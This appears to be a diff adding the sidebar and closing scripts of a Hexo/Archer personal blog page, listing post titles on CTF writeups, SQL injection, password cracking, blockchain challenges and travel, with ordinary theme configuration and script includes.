+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 16
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2020/12/02/study-sqli/" >【学习】天枢队内培训-SQL注入部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2020/10/05/study-hashcat_aircrack_wifi_wpa/" >【学习】hashcat爆破、wifi握手包工具总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2020/03/20/wp-202002zhanyi-OwnerMoney/" >【区块链】赛宁新春战役CTF-区块链-OwnerMoney</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/20</span><a class="archive-post-title" href= "/2020/01/20/wp-202001hitcon-Bank/" >【区块链】Hitcon2019-区块链-Bank</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/20</span><a class="archive-post-title" href= "/2020/01/20/wp-202001hitcon-Creativity/" >【区块链】Hitcon2019-区块链-Creativity</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2019/04/22/wp-201905ciscn-DaysBank/" >【writeup】DaysBank</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2019/04/04/study-hard-mysql-query-4/" >【SQL】四个比较难的SQL语句</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/study-how-to-interview-for-mysql/" >【SQL】SQL语句怎么写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2019/03/26/study-get-startted-with-python/" >python入门的文档总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2019/03/23/wp-201905tctf-quals/" >【writeup】tctf2019-quals</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2019/03/21/dev-mina-0/" >【研发】天天种树小程序 1 起步+调研</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span><a class="archive-post-title" href= "/2019/03/19/paper-merkle-tree-vulnerability/" >【安全研究】区块链公链审计过程中遇到的Merkle Tree底层实现问题 及 CVE-2012-2459分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/2019/03/17/study-create-blog/" >搭blog服务器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2019/02/28/travel-taiwan-0/" >台湾半岛游-其零</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/2018/11/21/wp-2018hctf/" >【writeup】hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/wp-2018dorahack-blockchain/" >【writeup】DoraHacks 区块链安全Hackathon</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="小程序"><span class="iconfont-archer">&#xe606;</span>小程序</span>
+    
+        <span class="sidebar-tag-name" data-tags="天天种树"><span class="iconfont-archer">&#xe606;</span>天天种树</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔试题"><span class="iconfont-archer">&#xe606;</span>笔试题</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
+    
+        <span class="sidebar-tag-name" data-tags="go"><span class="iconfont-archer">&#xe606;</span>go</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="服务器"><span class="iconfont-archer">&#xe606;</span>服务器</span>
+    
+        <span class="sidebar-tag-name" data-tags="nginx"><span class="iconfont-archer">&#xe606;</span>nginx</span>
+    
+        <span class="sidebar-tag-name" data-tags="淘宝店"><span class="iconfont-archer">&#xe606;</span>淘宝店</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="面试"><span class="iconfont-archer">&#xe606;</span>面试</span>
+    
+        <span class="sidebar-tag-name" data-tags="台湾"><span class="iconfont-archer">&#xe606;</span>台湾</span>
+    
+        <span class="sidebar-tag-name" data-tags="游记"><span class="iconfont-archer">&#xe606;</span>游记</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="天枢"><span class="iconfont-archer">&#xe606;</span>天枢</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="aircrack"><span class="iconfont-archer">&#xe606;</span>aircrack</span>
+    
+        <span class="sidebar-tag-name" data-tags="WPA"><span class="iconfont-archer">&#xe606;</span>WPA</span>
+    
+        <span class="sidebar-tag-name" data-tags="hashcat"><span class="iconfont-archer">&#xe606;</span>hashcat</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sissel"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
